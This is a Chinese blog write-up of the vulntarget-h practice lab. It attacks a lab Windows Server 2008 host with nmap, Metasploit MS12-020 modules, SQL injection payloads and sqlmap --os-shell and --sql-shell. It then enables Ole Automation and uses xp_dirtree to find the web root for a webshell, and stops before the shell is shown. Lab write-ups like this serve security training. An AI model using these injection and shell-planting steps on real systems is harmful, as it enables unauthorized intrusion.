<!DOCTYPE html><html lang="cn"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="robots" content="index, follow"><title>vulntarget-h WriteUp • Webb</title><meta name="description" content="vulntarget-h WriteUp - Webb"><link rel="icon" href="/57182600.jpeg"><link rel="stylesheet" href="https://unpkg.com/nanoreset@3.0.1/nanoreset.min.css"><link rel="stylesheet" href="/css/theme.css"><link rel="search" type="application/opensearchdescription+xml" href="/atom.xml" title="Webb"><meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="Webb" type="application/atom+xml">
</head><body><div class="wrap" id="barba-wrapper"><header><h1 class="branding"><a href="/" title="Webb"><img class="logo-image" src="/57182600.jpeg" alt="logo"></a></h1><ul class="nav nav-list"><li class="nav-list-item"><a class="nav-list-link no-barba" href="/" target="_self">主页</a></li><li class="nav-list-item"><a class="nav-list-link no-barba" href="/about" target="_self">关于</a></li><li class="nav-list-item"><a class="nav-list-link no-barba" href="/works" target="_self">作品</a></li><li class="nav-list-item"><a class="nav-list-link no-barba" href="/archives" target="_self">档案</a></li><li class="nav-list-item"></ul></header><div class="barba-container"><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">vulntarget-h WriteUp</h1><div class="post-info"><a></a>2022-06-30</div><div class="post-content"><blockquote>
<p>Vulntarget漏洞靶场</p>
<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/crow821/vulntarget">https://github.com/crow821/vulntarget</a></p>
</blockquote>
<h2 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h2><ul>
<li><p>详细的搭建教程我这里就不演示了，可以打开下方的链接查看。</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/AGmqroovR1EZN-QKnpSfDQ">vulntarget漏洞靶场系列（八）— vulntarget-h</a></p>
</li>
<li><p>你也可以通过项目地址的下载链接下载。</p>
</li>
<li><p>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1sv9qdioNF4PTUliix5HEfg">https://pan.baidu.com/s/1sv9qdioNF4PTUliix5HEfg</a> 提取码： <strong>2dwq</strong>。</p>
</li>
</ul>
<h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><blockquote>
<p><strong>提示：</strong><br>Windows Server 2008 拥有两个网卡其中网卡3是桥接。该网卡的IP存在问题这里我就把虚拟机桥接模式改成NAT然后再修改回桥接模式。</p>
</blockquote>
<h3 id="Windows-Server-2008"><a href="#Windows-Server-2008" class="headerlink" title="Windows Server 2008"></a>Windows Server 2008</h3><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><ul>
<li>使用<code>nmap</code>找到Windows Server 2008的IP地址。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ nmap -sn 192.168.1.1/24</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-30 04:22 EDT</span><br><span class="line">...</span><br><span class="line">Nmap scan report <span class="keyword">for</span> WIN-7DSM1JVE9PO (192.168.1.99)</span><br><span class="line">Host is up (0.0035s latency).</span><br><span class="line">Nmap <span class="keyword">done</span>: 256 IP addresses (6 hosts up) scanned <span class="keyword">in</span> 2.82 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>查看Windows Server 2008开放的端口并使用<code>nmap</code>扫描端口是否存在漏洞。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ nmap -sV 192.168.1.99 --script=vuln</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-30 04:30 EDT</span><br><span class="line">Stats: 0:06:42 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan</span><br><span class="line">Nmap scan report <span class="keyword">for</span> WIN-7DSM1JVE9PO (192.168.1.99)</span><br><span class="line">Host is up (0.0011s latency).</span><br><span class="line">Not shown: 993 filtered tcp ports (no-response), 2 filtered tcp ports (host-unreach)</span><br><span class="line">PORT      STATE SERVICE            VERSION</span><br><span class="line">80/tcp    open  tcpwrapped</span><br><span class="line">|_http-server-header: Microsoft-IIS/7.5</span><br><span class="line">| http-slowloris-check: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Slowloris DOS attack</span><br><span class="line">|     State: LIKELY VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2007-6750</span><br><span class="line">|       Slowloris tries to keep many connections to the target web server open and hold</span><br><span class="line">|       them open as long as possible.  It accomplishes this by opening connections to</span><br><span class="line">|       the target web server and sending a partial request. By doing so, it starves</span><br><span class="line">|       the http server<span class="string">&#x27;s resources causing Denial Of Service.</span></span><br><span class="line"><span class="string">|       </span></span><br><span class="line"><span class="string">|     Disclosure date: 2009-09-17</span></span><br><span class="line"><span class="string">|     References:</span></span><br><span class="line"><span class="string">|       http://ha.ckers.org/slowloris/</span></span><br><span class="line"><span class="string">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span></span><br><span class="line"><span class="string">|_http-csrf: Couldn&#x27;</span>t find any CSRF vulnerabilities.</span><br><span class="line">|_http-dombased-xss: Couldn<span class="string">&#x27;t find any DOM based XSS.</span></span><br><span class="line"><span class="string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.</span><br><span class="line">135/tcp   open  msrpc              Microsoft Windows RPC</span><br><span class="line">445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds</span><br><span class="line">3389/tcp  open  ssl/ms-wbt-server?</span><br><span class="line">| rdp-vuln-ms12-020: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   MS12-020 Remote Desktop Protocol Denial Of Service Vulnerability</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2012-0152</span><br><span class="line">|     Risk <span class="built_in">factor</span>: Medium  CVSSv2: 4.3 (MEDIUM) (AV:N/AC:M/Au:N/C:N/I:N/A:P)</span><br><span class="line">|           Remote Desktop Protocol vulnerability that could allow remote attackers to cause a denial of service.</span><br><span class="line">|           </span><br><span class="line">|     Disclosure <span class="built_in">date</span>: 2012-03-13</span><br><span class="line">|     References:</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0152</span><br><span class="line">|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020</span><br><span class="line">|   </span><br><span class="line">|   MS12-020 Remote Desktop Protocol Remote Code Execution Vulnerability</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2012-0002</span><br><span class="line">|     Risk <span class="built_in">factor</span>: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)</span><br><span class="line">|           Remote Desktop Protocol vulnerability that could allow remote attackers to execute arbitrary code on the targeted system.</span><br><span class="line">|           </span><br><span class="line">|     Disclosure <span class="built_in">date</span>: 2012-03-13</span><br><span class="line">|     References:</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0002</span><br><span class="line">|_      http://technet.microsoft.com/en-us/security/bulletin/ms12-020</span><br><span class="line">|_ssl-ccs-injection: No reply from server (TIMEOUT)</span><br><span class="line">49154/tcp open  unknown</span><br><span class="line">Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED</span><br><span class="line">|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: EOF</span><br><span class="line">|_smb-vuln-ms10-054: <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 554.63 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>通过上面的返回结果我们可以发现多个漏洞，接下来我们就使用<code>msfconsole</code>的漏洞利用模块验证是否可以使用。</li>
</ul>
<blockquote>
<p>CVE-2007-6750 该漏洞不属于IIS服务。<br>CVE-2012-0152</p>
<p>CVE-2012-0002</p>
<ul>
<li>这里一共搜索到两个模块。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search ms12-020</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  Name                                              Disclosure Date  Rank    Check  Description</span></span><br><span class="line">   -  ----                                              ---------------  ----    -----  -----------</span><br><span class="line">   0  auxiliary/scanner/rdp/ms12_020_check                               normal  Yes    MS12-020 Microsoft Remote Desktop Checker</span><br><span class="line">   1  auxiliary/dos/windows/rdp/ms12_020_maxchannelids  2012-03-16       normal  No     MS12-020 Microsoft Remote Desktop Use-After-Free DoS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 1, use 1 or use auxiliary/dos/windows/rdp/ms12_020_maxchannelids</span><br></pre></td></tr></table></figure>

<p>使用<code>auxiliary/scanner/rdp/ms12_020_check</code>模块。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use auxiliary/scanner/rdp/ms12_020_check</span><br><span class="line">msf6 auxiliary(scanner/rdp/ms12_020_check) &gt; <span class="built_in">set</span> rhosts 192.168.1.99</span><br><span class="line">rhosts =&gt; 192.168.1.99</span><br><span class="line">msf6 auxiliary(scanner/rdp/ms12_020_check) &gt; exploit </span><br><span class="line"></span><br><span class="line">[+] 192.168.1.99:3389     - 192.168.1.99:3389 - The target is vulnerable.</span><br><span class="line">[*] 192.168.1.99:3389     - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>

<p>这里显示<strong>The target is vulnerable.（目标很脆弱。）</strong>，但是我找到该漏洞的exp并不能对目标造成影响。接下来我们继续尝试另外一个模块。</p>
<p>使用<code>auxiliary/dos/windows/rdp/ms12_020_maxchannelids</code>模块。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf6 auxiliary(scanner/rdp/ms12_020_check) &gt; use auxiliary/dos/windows/rdp/ms12_020_maxchannelids</span><br><span class="line">msf6 auxiliary(dos/windows/rdp/ms12_020_maxchannelids) &gt; <span class="built_in">set</span> rhosts 192.168.1.99</span><br><span class="line">rhosts =&gt; 192.168.1.99</span><br><span class="line">msf6 auxiliary(dos/windows/rdp/ms12_020_maxchannelids) &gt; exploit </span><br><span class="line">[*] Running module against 192.168.1.99</span><br><span class="line"></span><br><span class="line">[*] 192.168.1.99:3389 - 192.168.1.99:3389 - Sending MS12-020 Microsoft Remote Desktop Use-After-Free DoS</span><br><span class="line">[*] 192.168.1.99:3389 - 192.168.1.99:3389 - 210 bytes sent</span><br><span class="line">[*] 192.168.1.99:3389 - 192.168.1.99:3389 - Checking RDP status...（RDP 服务无法访问）</span><br><span class="line">[-] 192.168.1.99:3389 - 192.168.1.99:3389 - RDP Service Unreachable</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>

<p>该模块也不能正常运行。接下来只能尝试其他端口。</p>
</blockquote>
<ul>
<li>使用<code>nikto</code>。并没有发现特别的信息。只能用浏览器打开看看能不能找到有用的数据了。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ nikto -host http://192.168.1.99</span><br><span class="line">- Nikto v2.1.6</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Target IP:          192.168.1.99</span><br><span class="line">+ Target Hostname:    192.168.1.99</span><br><span class="line">+ Target Port:        80</span><br><span class="line">+ Start Time:         2022-06-30 05:33:14 (GMT-4)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Server: Microsoft-IIS/7.5</span><br><span class="line">+ Retrieved x-aspnet-version header: 2.0.50727</span><br><span class="line">+ Retrieved x-powered-by header: ASP.NET</span><br><span class="line">+ The anti-clickjacking X-Frame-Options header is not present.</span><br><span class="line">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span><br><span class="line">+ The X-Content-Type-Options header is not <span class="built_in">set</span>. This could allow the user agent to render the content of the site <span class="keyword">in</span> a different fashion to the MIME <span class="built_in">type</span></span><br><span class="line">+ No CGI Directories found (use <span class="string">&#x27;-C all&#x27;</span> to force check all possible <span class="built_in">dirs</span>)</span><br><span class="line">+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST </span><br><span class="line">+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST </span><br><span class="line">+ 8068 requests: 0 error(s) and 7 item(s) reported on remote host</span><br><span class="line">+ End Time:           2022-06-30 05:34:13 (GMT-4) (59 seconds)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ 1 host(s) tested</span><br></pre></td></tr></table></figure>

<ul>
<li>使用<code>dirb</code>并没有发现有用的数据。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ dirb http://192.168.1.99</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Thu Jun 30 06:03:46 2022</span><br><span class="line">URL_BASE: http://192.168.1.99/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.1.99/ ----</span><br><span class="line">+ http://192.168.1.99/reports (CODE:401|SIZE:0)                                                                                                            </span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Thu Jun 30 06:03:49 2022</span><br><span class="line">DOWNLOADED: 4612 - FOUND: 1</span><br></pre></td></tr></table></figure>

<ul>
<li>打开发现网站提示我们该网站存在SQL注入。</li>
</ul>
<p><img src="/../images/vulntarget-h%20write-up/%E6%88%AA%E5%9B%BE_2022-06-30_17-46-50.png" alt="截图_2022-06-30_17-46-50.png"></p>
<ul>
<li>判断该网站是否存在SQL注入。存在数字型注入。</li>
</ul>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://192.168.1.99/?user_id=1%20and%201=2">http://192.168.1.99/?user_id=1%20and%201=2</a></p>
</blockquote>
<p><img src="/../images/vulntarget-h%20write-up/Screenshot_2022-06-30_05-54-25.png" alt="Screenshot_2022-06-30_05-54-25.png"></p>
<ul>
<li>获取当前用户信息。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 判断是否是SA权限</span></span><br><span class="line">?user_id=-1%20union%20select%200,1,2,is_srvrolemember(<span class="string">&#x27;sysadmin&#x27;</span>),4</span><br><span class="line"><span class="comment"># 判断是否是db_owner权限</span></span><br><span class="line">?user_id=-1%20union%20select%200,1,2,is_member(<span class="string">&#x27;db_owner&#x27;</span>),4</span><br><span class="line"><span class="comment"># 判断是否是public权限</span></span><br><span class="line">?user_id=-1%20union%20select%200,1,2,is_srvrolemember(<span class="string">&#x27;public&#x27;</span>),4</span><br></pre></td></tr></table></figure>

<ul>
<li>接下来使用<code>sqlmap</code>尝试是否能获取shell。但是无法反弹shell应该是被杀毒程序拦截。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ sqlmap <span class="string">&quot;http://192.168.1.99/?user_id=1&quot;</span> --os-shell</span><br><span class="line">        ___</span><br><span class="line">       __H__                                                                                                                                                </span><br><span class="line"> ___ ___[<span class="string">&#x27;]_____ ___ ___  &#123;1.6.6#stable&#125;                                                                                                                    </span></span><br><span class="line"><span class="string">|_ -| . [&#x27;</span>]     | .<span class="string">&#x27;| . |                                                                                                                                   </span></span><br><span class="line"><span class="string">|___|_  [&#x27;</span>]_|_|_|__,|  _|                                                                                                                                   </span><br><span class="line">      |_|V...       |_|   https://sqlmap.org                                                                                                                </span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap <span class="keyword">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="string">&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 06:05:41 /2022-06-30/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[06:05:42] [INFO] resuming back-end DBMS &#x27;</span>microsoft sql server<span class="string">&#x27; </span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">[06:09:00] [CRITICAL] connection timed out to the target URL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 06:09:00 /2022-06-30/</span></span><br></pre></td></tr></table></figure>

<h4 id="写入shell"><a href="#写入shell" class="headerlink" title="写入shell"></a>写入shell</h4><blockquote>
<ul>
<li>自动化不能使用只能靠手动了。利用<code>--sql-shell</code>是执行数据库语句。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ sqlmap <span class="string">&quot;http://192.168.1.99?user_id=1&quot;</span>  --sql-shell</span><br><span class="line">        ___</span><br><span class="line">       __H__                                                                                                                                                </span><br><span class="line"> ___ ___[,]_____ ___ ___  &#123;1.6.6<span class="comment">#stable&#125;                                                                                                                    </span></span><br><span class="line">|_ -| . [(]     | .<span class="string">&#x27;| . |                                                                                                                                   </span></span><br><span class="line"><span class="string">|___|_  [,]_|_|_|__,|  _|                                                                                                                                   </span></span><br><span class="line"><span class="string">      |_|V...       |_|   https://sqlmap.org                                                                                                                </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;</span>s responsibility to obey all applicable <span class="built_in">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="keyword">for</span> any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 06:44:35 /2022-06-30/</span><br><span class="line">...</span><br><span class="line">[06:44:35] [INFO] the back-end DBMS is Microsoft SQL Server</span><br><span class="line">web server operating system: Windows 7 or 2008 R2</span><br><span class="line">web application technology: ASP.NET 2.0.50727, Microsoft IIS 7.5, ASP.NET</span><br><span class="line">back-end DBMS: Microsoft SQL Server 2008</span><br><span class="line">[06:44:35] [INFO] calling Microsoft SQL Server shell. To quit <span class="built_in">type</span> <span class="string">&#x27;x&#x27;</span> or <span class="string">&#x27;q&#x27;</span> and press ENTER</span><br><span class="line">sql-shell&gt; </span><br></pre></td></tr></table></figure>

<h5 id="找出网站根目录。"><a href="#找出网站根目录。" class="headerlink" title="找出网站根目录。"></a>找出网站根目录。</h5><ul>
<li>首先要开启sp_oacareate这个存储过程。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sql-shell&gt; <span class="built_in">exec</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, 1;RECONFIGURE;</span><br><span class="line">[09:26:05] [INFO] executing SQL data execution statement: <span class="string">&#x27;exec sp_configure &#x27;</span>show advanced options<span class="string">&#x27;, 1;RECONFIGURE&#x27;</span></span><br><span class="line"><span class="built_in">exec</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, 1;RECONFIGURE: <span class="string">&#x27;NULL&#x27;</span></span><br><span class="line">sql-shell&gt; <span class="built_in">exec</span> sp_configure <span class="string">&#x27;Ole Automation Procedures&#x27;</span>,1;RECONFIGURE;</span><br><span class="line">[09:26:11] [INFO] executing SQL data execution statement: <span class="string">&#x27;exec sp_configure &#x27;</span>Ole Automation Procedures<span class="string">&#x27;,1;RECONFIGURE&#x27;</span></span><br><span class="line"><span class="built_in">exec</span> sp_configure <span class="string">&#x27;Ole Automation Procedures&#x27;</span>,1;RECONFIGURE: <span class="string">&#x27;NULL&#x27;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>先创建一个tmp表然后将xp_dirtree的结果输出到tmp中。</p>
</li>
<li><p>添加数据到tmp表中。这里我们先从IIS默认路径开始。</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE tmp (<span class="built_in">dir</span> varchar(8000),num int,num1 int);</span><br><span class="line">insert into tmp(<span class="built_in">dir</span>,num,num1) execute master..xp_dirtree <span class="string">&#x27;c:\inetpub\&#x27;</span>,1,1;</span><br></pre></td></tr></table></figure>

<p><img src="/../images/vulntarget-h%20write-up/Screenshot_2022-06-30_10-06-00.png" alt="Screenshot_2022-06-30_10-06-00.png"></p>
<ul>
<li>使用<code>sqlmap</code>查看刚才插入的数据。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ sqlmap <span class="string">&quot;http://192.168.1.99?user_id=1&quot;</span> -D <span class="string">&quot;FoundStone_Bank&quot;</span> -T <span class="string">&quot;tmp&quot;</span> -C <span class="string">&quot;dir&quot;</span> --dump --flush-session</span><br><span class="line">        ___</span><br><span class="line">       __H__                                                                                                                                                </span><br><span class="line"> ___ ___[<span class="string">&#x27;]_____ ___ ___  &#123;1.6.6#stable&#125;                                                                                                                    </span></span><br><span class="line"><span class="string">|_ -| . [,]     | .&#x27;</span>| . |                                                                                                                                   </span><br><span class="line">|___|_  [(]_|_|_|__,|  _|                                                                                                                                   </span><br><span class="line">      |_|V...       |_|   https://sqlmap.org                                                                                                                </span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap <span class="keyword">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="string">&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 10:10:47 /2022-06-30/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[10:10:47] [INFO] flushing session file</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">Database: FoundStone_Bank</span></span><br><span class="line"><span class="string">Table: tmp</span></span><br><span class="line"><span class="string">[6 entries]</span></span><br><span class="line"><span class="string">+----------------+</span></span><br><span class="line"><span class="string">| dir            |</span></span><br><span class="line"><span class="string">+----------------+</span></span><br><span class="line"><span class="string">| custerr        |</span></span><br><span class="line"><span class="string">| edrfgyhujikopl |</span></span><br><span class="line"><span class="string">| history        |</span></span><br><span class="line"><span class="string">| logs           |</span></span><br><span class="line"><span class="string">| temp           |</span></span><br><span class="line"><span class="string">| wwwroot        |</span></span><br><span class="line"><span class="string">+----------------+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[10:11:27] [INFO] table &#x27;</span>FoundStone_Bank.dbo.tmp<span class="string">&#x27; dumped to CSV file &#x27;</span>/home/kali/.local/share/sqlmap/output/192.168.1.99/dump/FoundStone_Bank/tmp.csv<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:11:27] [WARNING] HTTP error codes detected during run:</span></span><br><span class="line"><span class="string">500 (Internal Server Error) - 61 times</span></span><br><span class="line"><span class="string">[10:11:27] [INFO] fetched data logged to text files under &#x27;</span>/home/kali/.local/share/sqlmap/output/192.168.1.99<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 10:11:27 /2022-06-30/</span></span><br></pre></td></tr></table></figure>

<h5 id="将shell写入网站根目录。"><a href="#将shell写入网站根目录。" class="headerlink" title="将shell写入网站根目录。"></a>将shell写入网站根目录。</h5><ul>
<li>从上面的结果发现有一个比较特别的目录。接下来我们尝试在该目录写入shell。这里我们先做一下免杀防止被删除，我就不把免杀的shell放出来了。</li>
</ul>
